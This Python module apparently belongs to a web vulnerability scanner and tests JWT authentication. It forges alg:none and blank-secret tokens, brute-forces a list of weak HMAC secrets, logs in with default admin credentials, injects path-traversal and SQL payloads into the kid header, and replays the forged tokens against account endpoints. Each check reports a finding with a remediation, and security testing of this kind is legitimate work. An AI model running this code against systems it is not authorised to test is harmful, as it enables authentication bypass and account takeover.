"""
AmonStrike — JWT Deep Attack Module
JSON Web Tokens are used everywhere and misconfigured constantly.

Attacks:
  1. None algorithm attack     — alg:none bypasses signature
  2. Weak secret brute force   — crack HMAC-signed tokens
  3. Algorithm confusion        — RS256→HS256 key confusion
  4. JWT header injection       — jwk/jku parameter injection
  5. Expired token acceptance   — server doesn't check exp
  6. Kid header injection       — SQL/path injection in kid
  7. Blank password attack      — empty secret
  8. Public key as secret       — HS256 with RS256 pub key
"""

import re
import json
import base64
import hmac
import hashlib
from .base import BaseModule


class JwtDeepModule(BaseModule):
    NAME        = "jwt_deep"
    DESCRIPTION = "JWT attacks — none alg, weak secret, RS256→HS256, kid injection"

    # Common weak JWT secrets to try
    WEAK_SECRETS = [
        "secret", "password", "123456", "key", "jwt_secret",
        "your-256-bit-secret", "supersecret", "changeme",
        "jwt", "secret123", "token", "api_key", "app_secret",
        "private", "test", "development", "", "null",
        "HS256", "RS256", "qwerty", "letmein",
    ]

    def run(self):
        self.log("Testing JWT security...")

        # Find JWT tokens in responses
        tokens = self._find_jwt_tokens()
        self.info["tokens_found"] = len(tokens)

        if not tokens:
            self.log("No JWT tokens found in responses", "~")
            # Still test the login/auth endpoints
            tokens = self._find_jwt_via_auth()

        for token in tokens:
            self.log(f"Testing JWT: {token[:30]}...", "i")
            self._test_jwt(token)

        self.log(f"JWT scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _find_jwt_tokens(self) -> list:
        """Find JWT tokens in response headers, cookies, and body."""
        tokens = []
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'

        endpoints = ["/", "/api", "/api/v1", "/dashboard", "/profile"]
        for path in endpoints:
            resp = self.get(path)
            if not resp:
                continue

            # Headers
            for hval in resp.headers.values():
                for token in re.findall(jwt_pattern, hval):
                    tokens.append(token)

            # Cookies
            for cval in resp.cookies.values():
                for token in re.findall(jwt_pattern, cval):
                    tokens.append(token)

            # Body
            for token in re.findall(jwt_pattern, resp.text):
                tokens.append(token)

        return list(set(tokens))

    def _find_jwt_via_auth(self) -> list:
        """Try to get a JWT by logging in with default credentials."""
        tokens = []
        auth_paths = ["/api/auth", "/api/login", "/api/token",
                     "/oauth/token", "/auth/token"]

        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'

        for path in auth_paths:
            for creds in [{"username":"admin","password":"admin"},
                         {"email":"admin@admin.com","password":"admin"}]:
                resp = self.post(path, json=creds)
                if resp and resp.status_code in [200,201]:
                    for token in re.findall(jwt_pattern, resp.text):
                        tokens.append(token)
                    for token in re.findall(jwt_pattern,
                                           str(resp.headers)):
                        tokens.append(token)

        return list(set(tokens))

    def _decode_jwt(self, token: str) -> tuple:
        """Decode JWT without verification. Returns (header, payload, signature)."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None, None, None

            def decode_part(s):
                # Add padding if needed
                s += "=" * (4 - len(s) % 4)
                return json.loads(base64.urlsafe_b64decode(s))

            header  = decode_part(parts[0])
            payload = decode_part(parts[1])
            return header, payload, parts[2]
        except Exception:
            return None, None, None

    def _encode_jwt(self, header: dict, payload: dict, secret: str = "") -> str:
        """Create a JWT with given header and payload."""
        def encode_part(d):
            return base64.urlsafe_b64encode(
                json.dumps(d, separators=(",",":")).encode()
            ).rstrip(b"=").decode()

        h = encode_part(header)
        p = encode_part(payload)

        if header.get("alg","none").lower() == "none":
            return f"{h}.{p}."

        # HS256
        sig = hmac.new(
            secret.encode(), f"{h}.{p}".encode(), hashlib.sha256
        ).digest()
        s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{h}.{p}.{s}"

    def _test_jwt(self, token: str):
        """Run all JWT attacks against a token."""
        header, payload, sig = self._decode_jwt(token)
        if not header or not payload:
            return

        self.log(f"JWT alg={header.get('alg','?')}", "i")

        # Attack 1: None algorithm
        self._test_none_algorithm(token, header, payload)

        # Attack 2: Blank secret
        self._test_blank_secret(token, header, payload)

        # Attack 3: Weak secret brute force
        self._test_weak_secrets(token, header, payload)

        # Attack 4: Algorithm confusion (RS256 → HS256)
        if header.get("alg","").startswith("RS"):
            self._test_algorithm_confusion(token, header, payload)

        # Attack 5: Expired token acceptance
        self._test_expired_token(token, header, payload)

        # Attack 6: Check for sensitive data in payload
        self._check_sensitive_payload(token, payload)

        # Attack 7: kid header injection
        if "kid" in header:
            self._test_kid_injection(token, header, payload)

    def _test_none_algorithm(self, token, header, payload):
        """Test if server accepts 'none' algorithm."""
        # Create token with alg:none
        new_header  = dict(header)
        new_header["alg"] = "none"

        for alg_variant in ["none","None","NONE","nOnE"]:
            new_header["alg"] = alg_variant
            fake_token = self._encode_jwt(new_header, payload, "")

            if self._token_works(fake_token):
                self.add_finding(
                    title="JWT None Algorithm Attack Succeeds",
                    severity="CRITICAL",
                    description="Server accepts JWTs with alg:none, allowing complete signature bypass. Any attacker can forge valid tokens.",
                    evidence=f"Original alg: {header.get('alg','')}\nForged token (alg:none): {fake_token[:80]}...\nServer accepted the unsigned token",
                    remediation="Explicitly whitelist allowed algorithms. Reject tokens with alg:none. Use a JWT library that doesn't accept none algorithm.",
                    url=self.url,
                    cve="CWE-347"
                )
                return

    def _test_blank_secret(self, token, header, payload):
        """Test if server uses empty/blank secret."""
        if header.get("alg","").startswith("HS"):
            fake_token = self._encode_jwt(header, payload, "")
            if self._token_works(fake_token):
                self.add_finding(
                    title="JWT Uses Empty/Blank Secret",
                    severity="CRITICAL",
                    description="JWT is signed with an empty string secret, allowing trivial forgery.",
                    evidence=f"Token signed with empty secret accepted by server",
                    remediation="Use a cryptographically random secret of at least 256 bits.",
                    url=self.url,
                    cve="CWE-347"
                )

    def _test_weak_secrets(self, token, header, payload):
        """Brute force common weak JWT secrets."""
        if not header.get("alg","").startswith("HS"):
            return

        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}"

        for secret in self.WEAK_SECRETS:
            try:
                sig = hmac.new(
                    secret.encode(),
                    signing_input.encode(),
                    hashlib.sha256
                ).digest()
                expected_sig = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

                if expected_sig == parts[2]:
                    self.add_finding(
                        title=f"JWT Weak Secret Found: '{secret}'",
                        severity="CRITICAL",
                        description=f"JWT is signed with weak secret '{secret}'. Attackers can forge arbitrary tokens.",
                        evidence=f"Algorithm: {header.get('alg','')}\nSecret: {secret}\nSignature verified locally",
                        remediation="Use cryptographically random secret of 256+ bits. Rotate the secret immediately.",
                        url=self.url,
                        cve="CWE-347"
                    )
                    return
            except Exception:
                pass

    def _test_algorithm_confusion(self, token, header, payload):
        """Test RS256 → HS256 algorithm confusion attack."""
        # This requires the public key — check if it's exposed
        pubkey_paths = [
            "/.well-known/jwks.json",
            "/api/.well-known/jwks.json",
            "/oauth/jwks.json",
            "/api/auth/jwks",
        ]
        for path in pubkey_paths:
            resp = self.get(path)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if "keys" in data:
                        self.add_finding(
                            title="Public Key Exposed — Potential RS256→HS256 Confusion",
                            severity="HIGH",
                            description=f"Public key found at {path}. If server doesn't strictly check algorithm, this key can be used as HMAC secret to forge RS256 tokens as HS256.",
                            evidence=f"JWKS endpoint: {self.url}{path}\nKeys found: {len(data['keys'])}",
                            remediation="Strictly whitelist allowed algorithms. Never accept both RS256 and HS256 for the same key.",
                            url=self.url + path,
                            cve="CWE-347"
                        )
                except Exception:
                    pass

    def _test_expired_token(self, token, header, payload):
        """Test if server accepts expired tokens."""
        if "exp" not in payload:
            self.add_finding(
                title="JWT Missing Expiration (exp) Claim",
                severity="MEDIUM",
                description="JWT has no expiration claim. Stolen tokens are valid indefinitely.",
                evidence=f"Token payload has no 'exp' field: {json.dumps(payload)[:200]}",
                remediation="Always include exp claim. Set short expiration (15 min - 1 hour) for access tokens.",
                url=self.url,
                cve="CWE-613"
            )
        else:
            # Create an expired token with past exp
            new_payload = dict(payload)
            new_payload["exp"] = 1000000  # Year 1970 — expired
            expired_token = self._encode_jwt(header, new_payload, "secret")
            if self._token_works(expired_token):
                self.add_finding(
                    title="Server Accepts Expired JWT Tokens",
                    severity="HIGH",
                    description="Server accepts JWT tokens with past expiration dates. Stolen tokens never expire.",
                    evidence=f"Token with exp=1000000 (1970) was accepted",
                    remediation="Validate exp claim server-side. Reject tokens with exp in the past.",
                    url=self.url,
                    cve="CWE-613"
                )

    def _check_sensitive_payload(self, token, payload):
        """Check if JWT payload contains sensitive data."""
        sensitive_keys = ["password","passwd","secret","key","api_key",
                         "token","credit_card","ssn","dob"]
        found = [k for k in payload if k.lower() in sensitive_keys]
        if found:
            self.add_finding(
                title=f"Sensitive Data in JWT Payload: {', '.join(found)}",
                severity="MEDIUM",
                description=f"JWT payload contains sensitive fields: {', '.join(found)}. JWT payloads are only base64-encoded, not encrypted — anyone can decode them.",
                evidence=f"Sensitive fields found: {found}\nPayload (partial): {str(payload)[:200]}",
                remediation="Never store sensitive data in JWT payload unless encrypted (JWE). JWT body is visible to any party holding the token.",
                url=self.url,
                cve="CWE-312"
            )

    def _test_kid_injection(self, token, header, payload):
        """Test kid header SQL/path injection."""
        kid_payloads = [
            "../../../../../../etc/passwd",
            "' OR '1'='1",
            "/dev/null",
        ]
        for kid_payload in kid_payloads[:2]:
            new_header = dict(header)
            new_header["kid"] = kid_payload
            fake_token = self._encode_jwt(new_header, payload, "")

            resp_headers = {
                "Authorization": f"Bearer {fake_token}",
                "Cookie": f"token={fake_token}",
            }
            resp = self.get(headers=resp_headers)
            if resp and resp.status_code in [200, 302]:
                self.add_finding(
                    title=f"JWT kid Header Injection: {kid_payload[:30]}",
                    severity="HIGH",
                    description="kid header in JWT may be injectable. Payload was accepted without error.",
                    evidence=f"kid payload: {kid_payload}\nResponse: HTTP {resp.status_code}",
                    remediation="Validate and sanitize kid header before use. Use a lookup table instead of file paths.",
                    url=self.url,
                    cve="CWE-20"
                )
                break

    def _token_works(self, token: str) -> bool:
        """Test if a JWT token grants access."""
        auth_paths = ["/api/me","/api/profile","/dashboard",
                     "/api/v1/user","/account"]

        for path in auth_paths[:3]:
            for header_name in ["Authorization", "X-Auth-Token"]:
                resp = self.get(
                    path,
                    headers={
                        header_name: f"Bearer {token}",
                        "Cookie":    f"token={token}; jwt={token}",
                    }
                )
                if resp and resp.status_code in [200, 201]:
                    # Check it's not just a public page
                    if any(w in resp.text.lower() for w in
                           ["user","profile","email","username","dashboard"]):
                        return True
        return False
